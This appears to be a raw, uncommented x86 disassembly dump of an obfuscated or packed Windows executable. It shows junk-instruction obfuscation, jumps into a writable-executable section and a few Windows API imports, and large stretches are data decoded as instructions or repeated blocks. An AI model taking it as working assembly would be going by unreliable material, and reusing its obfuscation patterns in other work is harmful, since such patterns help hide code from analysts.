jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_51498a
lea esp [ esp + 0x30 ]
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
cmc
test dl bl
cmp ebx 0x2
jmp rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
je rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmp bh 0x95
cmc
jmp rwxdata
pushad
jmp rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
cmp ebx 0x3
call j_sub_4ba3bf
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_51499f
push [ esp ]
jmp rwxdata
pushfd
adc ecx ecx
call sub_4d11da
adc [ eax + ecx + 0x5ca7fb7e ] ebx
jns rwxdata
out dx al
and esp [ ebp + 0x39e375a ]
push edx
adc [ edx + 0x1e ] eax
push 0x5f125920
or dh [ esi + 0x23 ]
in eax 0x6e
je rwxdata
inc ebx
pop ds
adc eax 0xc2933e1
inc ecx
pop esi
xchg edi eax
cwde
or al 0x55
retn 0xb9dc
xor al 0x24
insb
insb
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] ah
imul ebp [ eax + eax ] 0x64665f00
outsd
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
outsb
add [ ebp + 0xf0c2464 ] cl
cmp [ 0x60fffa2c ] 0x68
das
out dx eax
loope rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
lea esp [ esp + 0x24 ]
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
jmp rwxdata
push ecx
lea esp [ esp + 0x4 ]
jne rwxdata
jbe rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jne rwxdata
jpe rwxdata
jmp rwxdata
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
pushad
stosb [ edi ]
mov [ esp ] al
pushad
push [ esp ]
lea esp [ esp + 0x44 ]
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
call sub_516d74
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
